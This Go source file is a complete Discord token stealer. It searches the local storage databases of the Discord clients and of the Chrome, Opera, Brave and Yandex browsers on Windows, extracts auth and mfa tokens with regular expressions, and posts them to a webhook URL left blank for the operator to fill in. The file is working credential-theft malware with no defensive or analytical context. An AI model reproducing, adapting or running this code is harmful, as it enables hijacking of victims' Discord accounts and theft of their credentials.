package main

import (
	"bytes"
	"encoding/json"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

const webhookURL = "" // Your webHook URL

var paths = []string{
	filepath.Join(os.Getenv("APPDATA"), "discord", "Local Storage", "leveldb"),
	filepath.Join(os.Getenv("APPDATA"), "discordcanary", "Local Storage", "leveldb"),
	filepath.Join(os.Getenv("APPDATA"), "discordptb", "Local Storage", "leveldb"),
	filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
	filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
	filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
	filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),
}

func main() {
	tokens := []string{}
	for _, path := range paths {
		if _, err := os.Stat(path); err == nil {
			tokens = append(tokens, findTokens(path)...)
		}
	}
	sendWebhook(strings.Join(tokens, "\n"))
}

func findTokens(path string) []string {
	regexes := []*regexp.Regexp{
		regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}`),
		regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}`),
		regexp.MustCompile(`mfa\.[\w-]{84}`),
	}
	tokens := []string{}
	err := filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() && (strings.HasSuffix(p, ".ldb") || strings.HasSuffix(p, ".log")) {
			content, err := ioutil.ReadFile(p)
			if err != nil {
				return err
			}
			for _, r := range regexes {
				matches := r.FindAllString(string(content), -1)
				for _, m := range matches {
					tokens = append(tokens, m)
				}
			}
		}
		return nil
	})
	if err != nil {
		log.Fatal(err)
	}
	return tokens
}

func sendWebhook(message string) {
	values := map[string]string{
		"content": message,
	}
	jsonData, err := json.Marshal(values)
	if err != nil {
		log.Fatal(err)
	}
	resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		log.Fatal(err)
	}
	resp.Body.Close()
}